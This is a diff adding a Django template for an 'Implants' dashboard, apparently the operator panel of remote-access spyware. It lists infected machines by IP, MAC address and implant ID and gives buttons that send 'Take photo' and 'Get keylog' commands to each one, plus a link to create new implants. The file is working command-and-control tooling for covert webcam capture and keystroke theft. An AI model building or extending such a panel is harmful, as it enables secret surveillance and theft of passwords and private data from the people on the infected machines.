@@ -1,0 +1,40 @@
+{% extends 'base.html' %}
+
+{% block title %}Implants{% endblock %}
+
+{% block nav-implants %}
+<li class="nav-item active">
+  <a class="nav-link" href="/implants/">Implants<span class="sr-only">(current)</span></a>
+</li>
+{% endblock %}
+
+{% block content %}
+<h1>Implants</h1>
+{% if user_implants %}
+<div class="container-fluid">
+{% for implant in user_implants %}
+<div class="row justify-content-center">
+  <div class="col-xs" style="margin-bottom:50px;outline:3px dashed red; outline-offset:10px;">
+    <h2 style="background-color:gray;color:white">IP: {{ implant.ipAddress }}</h2>
+    <p>Mac Address: {{ implant.macAddress }}</p>
+    <p>Implant ID: {{ implant.implantID }}</p>
+    <p>Current command (0 is nothing): {{ implant.command }}</p>
+    <form method="POST" style="display:inline">
+      {% csrf_token %}
+      <input type="hidden" name="implantID" value="{{ implant.implantID }}">
+      <input type="hidden" name="command" value="2">
+      <input type="submit" value="Take photo" class="btn btn-outline-danger" role="button"></form>
+    <form method="POST" style="display:inline">
+      {% csrf_token %}
+      <input type="hidden" name="implantID" value="{{ implant.implantID }}">
+      <input type="hidden" name="command" value="1"> 
+      <input type="submit" value="Get keylog" class="btn btn-outline-danger" role="button"></form>
+  </div>
+</div>
+{% endfor %}
+</div>
+{% endif %}{% if not user_implants %}
+<h2>Why, you've not any implants! You should create one...</h2>
+<a href={% url 'create' %} class="btn btn-lg btn-info">+ Create an implant</a>
+{% endif %}
+{% endblock content %}
